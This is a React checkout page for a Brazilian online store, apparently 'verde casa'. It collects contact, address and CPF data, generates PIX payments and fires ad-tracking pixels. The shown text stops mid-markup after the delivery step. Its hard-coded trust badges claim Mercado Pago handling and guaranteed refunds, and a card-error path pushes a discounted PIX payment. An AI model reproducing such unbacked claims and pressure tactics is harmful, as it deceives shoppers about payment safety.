import { useState, useEffect } from "react";
import QRCode from "qrcode";
import { useCart } from "@/contexts/CartContext";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { EmailInput } from "@/components/EmailInput";
import {
  Lock,
  Copy,
  Check,
  Loader2,
  QrCode,
  ChevronDown,
  ChevronUp,
  User,
  Truck,
  CreditCard,
  Pencil,
  Minus,
  Plus,
  Trash2,
} from "lucide-react";
import {
  trackInitiateCheckout,
  trackContact,
  trackAddPaymentInfo,
  trackPurchase,
  UTMIFY_WEBHOOK_URL,
} from "@/lib/pixels";

type Step = 1 | 2 | 3 | 4;
type PaymentMethod = "pix" | "card";

interface CustomerInfo { name: string; email: string; phone: string; cpf: string; }
interface AddressInfo {
  cep: string; rua: string; bairro: string; cidade: string; estado: string;
  numero: string; complemento: string; destinatario: string;
}
interface CardInfo { numero: string; nome: string; validade: string; cvv: string; cpf: string; parcelas: string; }
interface PixData { pix_code: string; qrcode_image: string; transactionId: string; expiration: number; }

const formatCPF = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 11);
  if (digits.length <= 3) return digits;
  if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
  if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
  return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
};
const formatPhone = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 11);
  if (digits.length <= 2) return digits;
  if (digits.length <= 7) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
  return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
};
const formatCEP = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 8);
  if (digits.length <= 5) return digits;
  return `${digits.slice(0, 5)}-${digits.slice(5)}`;
};
const formatCardNumber = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
};
const formatValidade = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length <= 2) return digits;
  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
};

const useCountdown = (minutes: number) => {
  const [seconds, setSeconds] = useState(minutes * 60);
  useEffect(() => {
    const interval = setInterval(() => setSeconds((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(interval);
  }, []);
  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");
  return `${mm}:${ss}`;
};

const normalizeQrCodeImage = (value?: string) => {
  if (!value) return "";
  if (value.startsWith("data:image") || value.startsWith("http://") || value.startsWith("https://")) return value;
  return `data:image/png;base64,${value}`;
};

const SOCIAL_PROOFS = [
  {
    title: "Mercado Pago",
    text: "Nossos pagamentos são gerenciados pelo Mercado Pago. Segurança criptografada em todas as compras.",
    image: "https://assetsglobalbr.com/u/testimonies/ce4bb093.jpg",
  },
  {
    title: "Seguro Reembolso",
    text: "Receba sua compra ou nossa equipe devolverá todo seu dinheiro de volta na sua conta em poucos minutos.",
    image: "https://assetsglobalbr.com/u/testimonies/13507686.jpg",
  },
  {
    title: "Entrega Segura",
    text: "Foram mais de 1.000 produtos entregues para todo o Brasil em 2025, garantindo qualidade e satisfação!",
    image: "https://assetsglobalbr.com/u/testimonies/b9880edf.jpg",
  },
];

const SocialProofCarousel = () => {
  const [idx, setIdx] = useState(0);
  return (
    <div className="py-6">
      <div className="flex gap-3 overflow-x-auto snap-x snap-mandatory scrollbar-hide -mx-4 px-4"
        onScroll={(e) => {
          const el = e.currentTarget;
          const i = Math.round(el.scrollLeft / (el.clientWidth * 0.85));
          setIdx(i);
        }}
      >
        {SOCIAL_PROOFS.map((p, i) => (
          <div key={i} className="snap-center shrink-0 w-[85%] bg-white rounded-lg p-4 border border-border">
            <div className="flex items-start justify-between gap-2 mb-2">
              <div>
                <div className="text-yellow-500 text-sm leading-none mb-1">★★★★★</div>
                <p className="font-heading font-bold text-sm text-foreground">{p.title}</p>
              </div>
              <img src={p.image} alt={p.title} className="w-10 h-10 rounded-full object-cover border border-border" />
            </div>
            <p className="text-xs text-muted-foreground leading-relaxed">{p.text}</p>
          </div>
        ))}
      </div>
      <div className="flex justify-center gap-1.5 mt-3">
        {SOCIAL_PROOFS.map((_, i) => (
          <span key={i} className={`w-2 h-2 rounded-full transition-all ${i === idx ? "bg-foreground" : "bg-muted-foreground/30"}`} />
        ))}
      </div>
    </div>
  );
};

const CheckoutFooter = () => (
  <div className="bg-background -mx-4 px-4 py-8 mt-4 border-t border-border">
    <div className="flex flex-col items-center gap-6 max-w-xl mx-auto">
      <div className="flex flex-col items-center gap-4">
        <div className="text-center">
          <p className="text-[10px] text-[#8E9196] font-bold uppercase tracking-wider mb-3">MÉTODOS DE PAGAMENTO</p>
          <div className="flex flex-wrap justify-center gap-2">
            <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/visa.svg" alt="Visa" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
            <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
            <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/american-express.svg" alt="Amex" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
            <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/diners.svg" alt="Diners" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
            <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/discover.svg" alt="Discover" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
            <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/elo.svg" alt="Elo" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
            <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/hipercard.svg" alt="Hipercard" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
            <img src="https://raw.githubusercontent.com/aaronfagan/svg-credit-card-payment-icons/main/flat/hiper.svg" alt="Hiper" className="h-8 w-12 object-contain rounded-md bg-white border border-gray-200 p-1" />
            <div className="h-8 w-12 flex items-center justify-center rounded-md bg-white border border-gray-200 p-1">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640" className="h-5 w-5 fill-[#32BCAD]">
                <path d="M306.4 356.5C311.8 351.1 321.1 351.1 326.5 356.5L403.5 433.5C417.7 447.7 436.6 455.5 456.6 455.5L471.7 455.5L374.6 552.6C344.3 582.1 295.1 582.1 264.8 552.6L167.3 455.2C196.6 455.2 215.5 447.4 229.7 433.2L306.4 356.5zM326.5 282.9C320.1 288.4 311.9 288.5 306.4 282.9L229.7 206.2C215.5 191.1 196.6 184.2 176.6 184.2L167.3 184.2L264.7 86.8C295.1 56.5 344.3 56.5 374.6 86.8L471.8 183.9L456.6 183.9C436.6 183.9 417.7 191.7 403.5 205.9L326.5 282.9zM176.6 206.7C190.4 206.7 203.1 212.3 213.7 222.1L290.4 298.8C297.6 305.1 307 309.6 316.5 309.6C325.9 309.6 335.3 305.1 342.5 298.8L419.5 221.8C429.3 212.1 442.8 206.5 456.6 206.5L494.3 206.5L552.6 264.8C582.9 295.1 582.9 344.3 552.6 374.6L494.3 432.9L456.6 432.9C442.8 432.9 429.3 427.3 419.5 417.5L342.5 340.5C328.6 326.6 304.3 326.6 290.4 340.6L213.7 417.2C203.1 427 190.4 432.6 176.6 432.6L144.8 432.6L86.8 374.6C56.5 344.3 56.5 295.1 86.8 264.8L144.8 206.7L176.6 206.7z" />
              </svg>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-2 text-[#8E9196] font-bold text-xs uppercase tracking-tight mt-2">
          <div className="bg-[#8E9196] p-1 rounded-full">
            <Lock size={12} className="text-white" />
          </div>
          PAGAMENTO 100% SEGURO
        </div>
      </div>
      
      <div className="flex flex-col items-center gap-1 text-[10px] sm:text-xs text-[#8E9196] font-medium uppercase tracking-wider text-center">
        <p>CNPJ: 54.148.971/0001-38</p>
        <p>Avenida Brigadeiro Faria Lima, 2369, São Paulo, SP</p>
        <p>verde casa | Todos os direitos reservados</p>
      </div>
    </div>
  </div>
);

const CheckoutPage = () => {
  const { items, totalPrice, clearCart, updateQuantity, removeItem } = useCart();
  const navigate = useNavigate();
  const [step, setStep] = useState<Step>(1);
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>("pix");
  const [loading, setLoading] = useState(false);
  const [copied, setCopied] = useState(false);
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [qrCodeSrc, setQrCodeSrc] = useState("");
  const [showQrCode, setShowQrCode] = useState(false);
  const [cepLoading, setCepLoading] = useState(false);
  const [cepFound, setCepFound] = useState<boolean | null>(null);
  const [summaryOpen, setSummaryOpen] = useState(false);
  const [shippingOption, setShippingOption] = useState<"sedex" | "correios">("correios");

  const countdown = useCountdown(15);

  const [card, setCard] = useState<CardInfo>({ numero: "", nome: "", validade: "", cvv: "", cpf: "", parcelas: "1" });
  const [info, setInfo] = useState<CustomerInfo>(() => {
    const saved = localStorage.getItem("checkout_info");
    return saved ? JSON.parse(saved) : { name: "", email: "", phone: "", cpf: "" };
  });
  const [address, setAddress] = useState<AddressInfo>(() => {
    const saved = localStorage.getItem("checkout_address");
    return saved ? JSON.parse(saved) : {
      cep: "", rua: "", bairro: "", cidade: "", estado: "", numero: "", complemento: "", destinatario: "",
    };
  });
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [purchaseTracked, setPurchaseTracked] = useState(false);
  const [cardError, setCardError] = useState(false);

  useEffect(() => { localStorage.setItem("checkout_info", JSON.stringify(info)); }, [info]);
  useEffect(() => { localStorage.setItem("checkout_address", JSON.stringify(address)); }, [address]);

  const totalQuantity = items.reduce((sum, item) => sum + item.quantity, 0);
  const cartContentName = items.length > 1
    ? `${items[0].product.name} e mais ${items.length - 1} item(s)`
    : items[0]?.product.name + (items[0]?.variantLabel ? ` (${items[0].variantLabel})` : "");

  useEffect(() => {
    if (items.length > 0) {
      trackInitiateCheckout({
        totalValue: totalPrice,
        numItems: totalQuantity,
        contentIds: items.map((i) => i.product.id),
        contentName: cartContentName,
      });
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const shippingCost = shippingOption === "sedex" ? 9.64 : 0;
  const pixDiscount = totalPrice * 0.05;
  const baseTotal = step >= 2 ? totalPrice + shippingCost : totalPrice;
  const discountedTotal = totalPrice * 0.7;
  const cardErrorPixTotal = baseTotal * 0.7;
  const finalTotal = cardError
    ? cardErrorPixTotal
    : baseTotal - (paymentMethod === "pix" && step >= 3 ? pixDiscount : 0);
  const summaryTotal = finalTotal;

  useEffect(() => {
    const cepDigits = address.cep.replace(/\D/g, "");
    if (cepDigits.length === 8) {
      setCepLoading(true);
      setCepFound(null);
      fetch(`https://viacep.com.br/ws/${cepDigits}/json/`)
        .then((r) => r.json())
        .then((data) => {
          if (data.erro) setCepFound(false);
          else {
            setCepFound(true);
            setAddress((prev) => ({
              ...prev,
              rua: data.logradouro || "",
              bairro: data.bairro || "",
              cidade: data.localidade || "",
              estado: data.uf || "",
            }));
          }
        })
        .catch(() => setCepFound(false))
        .finally(() => setCepLoading(false));
    } else {
      setCepFound(null);
    }
  }, [address.cep]);

  useEffect(() => {
    let active = true;
    const buildQrCode = async () => {
      const fallbackImage = normalizeQrCodeImage(pixData?.qrcode_image);
      if (!pixData?.pix_code) { if (active) setQrCodeSrc(fallbackImage); return; }
      try {
        const generated = await QRCode.toDataURL(pixData.pix_code, { width: 256, margin: 1 });
        if (active) setQrCodeSrc(generated);
      } catch (error) {
        if (active) setQrCodeSrc(fallbackImage);
      }
    };
    buildQrCode();
    return () => { active = false; };
  }, [pixData]);

  useEffect(() => {
    if (!pixData?.transactionId || purchaseTracked) return;
    const pixValue = paymentMethod === "card" ? discountedTotal : finalTotal;
    let cancelled = false;
    const interval = setInterval(async () => {
      try {
        const { data, error } = await supabase.functions.invoke("check-pix-status", {
          body: { txid: pixData.transactionId },
        });
        if (cancelled || error) return;
        const status = (data?.status || "").toString().toUpperCase();
        if ((status === "CONCLUIDA" || status === "ATIVA" || status === "PAID" || status === "APPROVED") && !purchaseTracked) {
          const productNameForPixel =
            items.length === 1
              ? `${items[0].product.name} (x${items[0].quantity})`
              : `${items[0].product.name} e mais ${items.length - 1} item(s)`;
          setPurchaseTracked(true);
          trackPurchase({
            orderId: pixData.transactionId,
            totalValue: pixValue,
            contentIds: items.map((i) => i.product.id),
            contentName: productNameForPixel,
            numItems: totalQuantity,
          });
          clearInterval(interval);
        }
      } catch (e) { console.error("Erro polling PIX:", e); }
    }, 5000);
    return () => { cancelled = true; clearInterval(interval); };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [pixData?.transactionId, purchaseTracked]);

  const validateStep1 = (): boolean => {
    const e: Record<string, string> = {};
    if (!info.name.trim() || info.name.trim().split(/\s+/).length < 2) e.name = "Informe seu nome e sobrenome";
    if (!info.email.trim() || !/\S+@\S+\.\S+/.test(info.email)) e.email = "Digite um e-mail válido";
    const phoneDigits = info.phone.replace(/\D/g, "");
    if (phoneDigits.length < 10 || phoneDigits.length > 11) e.phone = "Telefone inválido";
    setErrors(e);
    return Object.keys(e).length === 0;
  };
  const validateStep2 = (): boolean => {
    const e: Record<string, string> = {};
    const cepDigits = address.cep.replace(/\D/g, "");
    if (cepDigits.length !== 8) e.cep = "CEP inválido";
    if (!address.rua.trim()) e.rua = "Endereço obrigatório";
    if (!address.numero.trim()) e.numero = "Número obrigatório";
    if (!address.bairro.trim()) e.bairro = "Bairro obrigatório";
    setErrors(e);
    return Object.keys(e).length === 0;
  };
  const validateStep3 = (): boolean => {
    const e: Record<string, string> = {};
    const cpfDigits = info.cpf.replace(/\D/g, "");
    if (cpfDigits.length !== 11) e.cpf = "CPF inválido";
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const handleNext = () => {
    if (step === 1 && validateStep1()) {
      trackContact({ email: info.email, phone: info.phone });
      setStep(2);
    } else if (step === 2 && validateStep2()) {
      setStep(3);
    }
  };

  const saveOrder = async (extra: Partial<Record<string, unknown>> = {}) => {
    try {
      const payload = {
        customer_name: info.name.trim(),
        customer_email: info.email.trim(),
        customer_phone: info.phone.replace(/\D/g, ""),
        customer_cpf: info.cpf.replace(/\D/g, ""),
        total_amount: parseFloat(finalTotal.toFixed(2)),
        payment_method: paymentMethod,
        zip_code: address.cep.replace(/\D/g, ""),
        address_street: address.rua,
        address_number: address.numero,
        address_neighborhood: address.bairro,
        address_city: address.cidade,
        address_state: address.estado,
        ...extra,
      };
      await supabase.functions.invoke("save-external-order", { body: payload });
    } catch (e) { console.error("Erro ao salvar pedido:", e); }
  };

  const handleGeneratePix = async () => {
    if (!validateStep3()) return;
    setLoading(true);
    setShowQrCode(false);
    const pixValue = cardError ? cardErrorPixTotal : (paymentMethod === "card" ? discountedTotal : finalTotal);
    saveOrder({ total_amount: parseFloat(pixValue.toFixed(2)), status: "pix_generated" });

    const productName =
      items.length === 1
        ? `${items[0].product.name} (x${items[0].quantity})`
        : `${items[0].product.name} e mais ${items.length - 1} item(s)`;

    const telefoneLimpo = info.phone.replace(/\D/g, "");
    const getCookie = (name: string): string => {
      const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
      return match ? match[2] : "";
    };
    const fbp = getCookie("_fbp");
    const fbc = getCookie("_fbc");
    const urlParams = new URLSearchParams(window.location.search);
    const utm_source = urlParams.get("utm_source") || "";
    const utm_campaign = urlParams.get("utm_campaign") || "";
    const utm_content = urlParams.get("utm_content") || productName;
    const src = urlParams.get("src") || "";
    const sck = urlParams.get("sck") || "";
    const productHash = items[0]?.product.zuckHash || items[0]?.product.id || "";

    try {
      const { data, error } = await supabase.functions.invoke("generate-pix", {
        body: {
          nome: info.name.trim(),
          cpf: info.cpf.replace(/\D/g, ""),
          valor: parseFloat(pixValue.toFixed(2)),
          email: info.email.trim(),
          telefone: telefoneLimpo,
          produto: productName,
          hash: productHash,
          fbp, fbc, utm_source, utm_campaign, utm_content, src, sck,
          urlnoty: UTMIFY_WEBHOOK_URL,
        },
      });
      if (error) throw new Error(error.message || "Erro ao gerar PIX");
      if (!data || (!data.pix_code && !data.raw)) throw new Error("Resposta vazia da API");
      setPixData(data);
      trackAddPaymentInfo({
        totalValue: pixValue,
        contentIds: items.map((i) => i.product.id),
        contentName: productName,
      });
      setStep(4);
    } catch (err) {
      alert(err instanceof Error ? err.message : "Erro ao gerar PIX. Tente novamente.");
    } finally { setLoading(false); }
  };

  const handleCopy = async () => {
    const code = pixData?.pix_code;
    if (!code) return;

    const copySuccess = () => {
      setCopied(true);
      setTimeout(() => setCopied(false), 3000);
    };

    try {
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(code);
        copySuccess();
      } else {
        const textArea = document.createElement("textarea");
        textArea.value = code;
        textArea.style.position = "fixed";
        textArea.style.left = "-9999px";
        textArea.style.top = "0";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        const successful = document.execCommand("copy");
        textArea.remove();
        if (successful) copySuccess();
      }
    } catch (err) {
      try {
        const input = document.createElement("input");
        input.setAttribute("value", code);
        document.body.appendChild(input);
        input.select();
        const successful = document.execCommand("copy");
        document.body.removeChild(input);
        if (successful) copySuccess();
      } catch (e) {
        console.error("Falha ao copiar PIX:", e);
      }
    }
  };

  if (items.length === 0 && step === 1) {
    return (
      <div className="min-h-screen bg-background flex flex-col items-center justify-center px-4">
        <p className="text-muted-foreground mb-4">Seu carrinho está vazio</p>
        <Button onClick={() => navigate("/produtos")} variant="default">Ver produtos</Button>
      </div>
    );
  }

  const parcelasOptions = () => {
    const opts = [];
    for (let i = 1; i <= 10; i++) {
      const val = (totalPrice + shippingCost) / i;
      opts.push(
        <option key={i} value={String(i)}>
          {i}x de R$ {val.toFixed(2).replace(".", ",")}{i > 1 ? " sem juros" : ""}
        </option>
      );
    }
    return opts;
  };

  const StepperIcon = ({ stepNum, icon, label }: { stepNum: number; icon: React.ReactNode; label: string }) => {
    const isActive = step === stepNum;
    const isPast = step > stepNum;
    const filled = isActive || isPast;
    return (
      <div className="flex flex-col items-center gap-1.5 flex-1 relative">
        <div className={`w-9 h-9 rounded-full flex items-center justify-center transition-all z-10 ${
          filled ? "bg-black text-white" : "bg-muted text-muted-foreground"
        }`}>
          {isPast ? <Check size={18} strokeWidth={3} /> : icon}
        </div>
        <span className={`text-[10px] font-bold uppercase tracking-wider ${filled ? "text-foreground" : "text-muted-foreground"}`}>
          {label}
        </span>
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-[#fdfdfd]">
      {/* Top header */}
      <div className="bg-white border-b border-border">
        <div className="max-w-lg mx-auto flex items-center justify-between px-4 py-3">
          <div className="font-heading font-bold text-2xl text-primary tracking-tight">
            verde<span className="text-foreground">casa</span>
          </div>
          <div className="flex items-center gap-2 bg-secondary/50 px-2.5 py-1.5 rounded-lg border border-border">
            <Lock size={13} className="text-primary" />
            <div className="flex flex-col">
              <span className="text-[10px] font-bold text-foreground leading-none">100% SEGURO</span>
              <span className="text-[9px] text-muted-foreground font-medium leading-none mt-0.5">AMBIENTE PROTEGIDO</span>
            </div>
          </div>
        </div>
      </div>

      {/* Highlight banner */}
      <div className="bg-primary text-primary-foreground text-center py-2.5 px-4 text-[13px] font-medium">
        Parabéns! Você garantiu <span className="font-bold">Frete Grátis</span> no <span className="font-bold">PIX</span> e um presente especial.
      </div>

      <div className="max-w-lg mx-auto px-4">
        {/* Resumo do pedido — collapsible */}
        {step <= 3 && (
          <div className="border-b border-border">
            <button
              onClick={() => setSummaryOpen(!summaryOpen)}
              className="w-full flex items-center justify-between py-3.5"
            >
              <span className="text-sm text-foreground">
                Resumo do pedido <span className="text-muted-foreground">({totalQuantity})</span>
              </span>
              <span className="flex items-center gap-2">
                <span className="font-heading font-bold text-base text-foreground">
                  R$ {summaryTotal.toFixed(2).replace(".", ",")}
                </span>
                {summaryOpen ? <ChevronUp size={18} /> : <ChevronDown size={18} />}
              </span>
            </button>
            {summaryOpen && (
              <div className="pb-4 space-y-3">
                {items.map((item) => (
                  <div key={`${item.product.id}-${item.variantLabel}`} className="flex gap-3 items-center">
                    <img src={item.product.image} alt={item.product.name} className="w-16 h-16 rounded object-cover border border-border" />
                    <div className="flex-1">
                      <div className="flex justify-between items-start">
                        <div>
                          <p className="text-sm font-medium leading-tight">{item.product.name}</p>
                          {item.variantLabel && <p className="text-[11px] text-primary mt-0.5">{item.variantLabel}</p>}
                        </div>
                        <button 
                          onClick={() => removeItem(item.product.id, item.variantLabel)}
                          className="text-muted-foreground hover:text-destructive transition-colors"
                        >
                          <Trash2 size={14} />
                        </button>
                      </div>
                      
                      <div className="flex items-center justify-between mt-2">
                        <div className="flex items-center border border-border rounded-md">
                          <button
                            onClick={() => updateQuantity(item.product.id, item.quantity - 1, item.variantLabel)}
                            className="p-1 hover:bg-secondary transition-colors"
                          >
                            <Minus size={12} />
                          </button>
                          <span className="w-8 text-center text-xs font-semibold">{item.quantity}</span>
                          <button
                            onClick={() => updateQuantity(item.product.id, item.quantity + 1, item.variantLabel)}
                            className="p-1 hover:bg-secondary transition-colors"
                          >
                            <Plus size={12} />
                          </button>
                        </div>
                        <p className="text-sm font-bold text-foreground">
                          R$ {(item.product.price * item.quantity).toFixed(2).replace(".", ",")}
                        </p>
                      </div>
                    </div>
                  </div>
                ))}
                {step >= 2 && shippingCost > 0 && (
                  <div className="flex justify-between text-sm pt-2 border-t border-border">
                    <span>Frete</span>
                    <span>R$ {shippingCost.toFixed(2).replace(".", ",")}</span>
                  </div>
                )}
              </div>
            )}
          </div>
        )}

        {/* Stepper */}
        {step <= 3 && (
          <div className="py-6 flex items-center justify-between gap-0 max-w-[340px] mx-auto relative">
            <div className="absolute top-[18px] left-[15%] right-[15%] h-[2px] bg-muted z-0">
              <div 
                className="h-full bg-black transition-all duration-500" 
                style={{ width: step === 1 ? "0%" : step === 2 ? "50%" : "100%" }}
              />
            </div>
            <StepperIcon stepNum={1} icon={<User size={16} />} label="Dados" />
            <StepperIcon stepNum={2} icon={<Truck size={16} />} label="Entrega" />
            <StepperIcon stepNum={3} icon={<CreditCard size={16} />} label="Pagamento" />
          </div>
        )}

        {/* STEP 1 */}
        {step === 1 && (
          <div className="space-y-5 pb-2">
            {/* Section title */}
            <div className="flex items-center justify-between">
              <h2 className="font-heading font-bold text-xl flex items-center gap-2">
                <span className="w-6 h-6 rounded-full bg-foreground text-background text-xs flex items-center justify-center">1</span>
                Identificação
              </h2>
              <span className="text-xs text-muted-foreground">1 de 3</span>
            </div>
            <p className="text-sm text-muted-foreground -mt-3">Preencha seus dados para envio do pedido.</p>

            <div className="space-y-1.5">
              <label className="text-sm font-semibold text-foreground">Nome completo</label>
              <Input
                placeholder="Digite seu nome completo"
                value={info.name}
                onChange={(e) => setInfo((p) => ({ ...p, name: e.target.value }))}
                className={`h-12 ${errors.name ? "border-destructive bg-destructive/5" : ""}`}
              />
              {errors.name && <p className="text-xs text-destructive font-medium">{errors.name}</p>}
            </div>

            <div className="space-y-1.5">
              <label className="text-sm font-semibold text-foreground">E-mail</label>
              <EmailInput
                placeholder="Digite seu e-mail"
                value={info.email}
                onChangeValue={(val) => setInfo((p) => ({ ...p, email: val }))}
                className={`h-12 ${errors.email ? "border-destructive bg-destructive/5" : ""}`}
              />
              {errors.email && <p className="text-xs text-destructive font-medium">{errors.email}</p>}
            </div>

            <div className="space-y-1.5">
              <label className="text-sm font-semibold text-foreground">Celular/Whatsapp</label>
              <div className="flex gap-2">
                <div className="flex items-center gap-1 border border-input rounded-md px-3 h-12 bg-background text-sm text-muted-foreground shrink-0">
                  +55
                </div>
                <Input
                  inputMode="numeric"
                  placeholder="(00) 00000-0000"
                  value={info.phone}
                  onChange={(e) => setInfo((p) => ({ ...p, phone: formatPhone(e.target.value) }))}
                  className={`h-12 ${errors.phone ? "border-destructive bg-destructive/5" : ""}`}
                />
              </div>
              {errors.phone && <p className="text-xs text-destructive font-medium">{errors.phone}</p>}
            </div>

            <Button onClick={handleNext} className="w-full h-14 text-base font-bold uppercase tracking-wide rounded-lg" size="lg">
              Continuar para Entrega
            </Button>

            <SocialProofCarousel />
          </div>
        )}

        {/* STEP 2 */}
        {step === 2 && (
          <div className="space-y-5 pb-2">
            {/* Identificação summary */}
            <div className="border border-border rounded-lg p-4 space-y-1">
              <div className="flex items-center justify-between">
                <p className="font-bold text-sm">Identificação</p>
                <button onClick={() => setStep(1)} className="text-xs text-muted-foreground flex items-center gap-1">
                  Editar <Pencil size={12} />
                </button>
              </div>
              <p className="text-sm text-foreground">{info.name}</p>
              <p className="text-sm text-muted-foreground">{info.email}</p>
              <p className="text-sm text-muted-foreground">{info.phone}</p>
            </div>

            <div className="flex items-center justify-between">
              <h2 className="font-heading font-bold text-xl flex items-center gap-2">
                <span className="w-6 h-6 rounded-full bg-foreground text-background text-xs flex items-center justify-center">2</span>
                Entrega
              </h2>
              <span className="text-xs text-muted-foreground">2 de 3</span>
            </div>
            <p className="text-sm text-muted-foreground -mt-3">Informe o endereço de entrega</p>

            <div className="space-y-1.5">
              <label className="text-sm font-semibold">CEP</label>
              <div className="flex gap-2 items-center">
                <div className="relative flex-1">
                  <Input
                    inputMode="numeric"
                    placeholder="00000-000"
                    value={address.cep}
                    onChange={(e) => setAddress((p) => ({ ...p, cep: formatCEP(e.target.value) }))}
                    className={`h-12 ${errors.cep ? "border-destructive" : cepFound ? "border-primary bg-primary/5" : ""}`}
                  />
                  {cepLoading && <Loader2 size={16} className="absolute right-3 top-1/2 -translate-y-1/2 animate-spin text-muted-foreground" />}
                  {cepFound === true && <Check size={18} className="absolute right-3 top-1/2 -translate-y-1/2 text-primary" />}
                </div>
                {address.cidade && (
                  <span className="text-sm text-muted-foreground shrink-0">{address.estado}/{address.cidade}</span>
                )}
              </div>
              {errors.cep && <p className="text-xs text-destructive font-medium">{errors.cep}</p>}
            </div>

            {cepFound === true && (
              <>
                <div className="space-y-1.5 animate-in fade-in slide-in-from-top-2 duration-300">
                  <label className="text-sm font-semibold">Endereço</label>
                  <div className="relative">
                    <Input
                      value={address.rua}
                      onChange={(e) => setAddress((p) => ({ ...p, rua: e.target.value }))}
                      className={`h-12 ${errors.rua ? "border-destructive" : address.rua ? "border-primary/50" : ""}`}
                    />
                    {address.rua && <Check size={18} className="absolute right-3 top-1/2 -translate-y-1/2 text-primary" />}
                  </div>
                  {errors.rua && <p className="text-xs text-destructive font-medium">{errors.rua}</p>}
                </div>

                <div className="grid grid-cols-2 gap-3 animate-in fade-in slide-in-from-top-2 duration-300">
                  <div className="space-y-1.5">
                    <label className="text-sm font-semibold">Nº</label>
                    <Input
                      inputMode="numeric"
                      placeholder="Número"
                      value={address.numero}
                      onChange={(e) => setAddress((p) => ({ ...p, numero: e.target.value }))}
                      className={`h-12 ${errors.numero ? "border-destructive" : ""}`}
                    />
                    {errors.numero && <p className="text-xs text-destructive font-medium">{errors.numero}</p>}
                  </div>
                  <div className="space-y-1.5">
                    <label className="text-sm font-semibold">Bairro</label>
                    <div className="relative">
                      <Input
                        value={address.bairro}
                        onChange={(e) => setAddress((p) => ({ ...p, bairro: e.target.value }))}
                        className={`h-12 ${errors.bairro ? "border-destructive" : address.bairro ? "border-primary/50" : ""}`}
                      />
                      {address.bairro && <Check size={18} className="absolute right-3 top-1/2 -translate-y-1/2 text-primary" />}
                    </div>
                    {errors.bairro && <p className="text-xs text-destructive font-medium">{errors.bairro}</p>}
                  </div>
                </div>

                <div className="space-y-1.5 animate-in fade-in slide-in-from-top-2 duration-300">
                  <label className="text-sm font-semibold">
                    Complemento <span className="text-muted-foreground font-normal">(Opcional)</span>
                  </label>
                  <Input
                    value={address.complemento}
                    onChange={(e) => setAddress((p) => ({ ...p, complemento: e.target.value }))}
                    className="h-12"
                  />
                </div>

                <div className="space-y-2 pt-2 animate-in fade-in slide-in-from-top-2 duration-300">
                  <p className="text-sm font-semibold">Escolha o frete:</p>
                  <label className={`flex items-center justify-between border rounded-lg p-3.5 cursor-pointer transition-all ${shippingOption === "correios" ? "border-primary bg-primary/5" : "border-border"}`}>
                    <div className="flex items-center gap-3">
                      <input type="radio" checked={shippingOption === "correios"} onChange={() => setShippingOption("correios")} className="accent-black" />
                      <img src="/logo-correios.png" alt="Correios" className="h-7 w-7 object-contain" />
                      <div>
                        <p className="text-sm font-semibold">Frete Grátis</p>
                        <p className="text-xs text-muted-foreground">7 a 10 dias úteis</p>
                      </div>
                    </div>
                    <span className="text-sm font-bold">Grátis</span>
                  </label>
                  <label className={`flex items-center justify-between border rounded-lg p-3.5 cursor-pointer transition-all ${shippingOption === "sedex" ? "border-primary bg-primary/5" : "border-border"}`}>
                    <div className="flex items-center gap-3">
                      <input type="radio" checked={shippingOption === "sedex"} onChange={() => setShippingOption("sedex")} className="accent-black" />
                      <img src="/logo-jadlog.png" alt="Jadlog" className="h-7 w-7 object-contain" />
                      <div>
                        <p className="text-sm font-semibold">Entrega Expressa</p>
                        <p className="text-xs text-muted-foreground">3 a 5 dias úteis</p>
                      </div>
                    </div>
                    <span className="text-sm font-bold">R$ 9,64</span>
                  </label>
                </div>
              </>
            )}

            <Button onClick={handleNext} className="w-full h-14 text-base font-bold uppercase tracking-wide rounded-lg mt-2" size="lg">
              Continuar para Pagamento
            </Button>

            <SocialProofCarousel />
          </div>
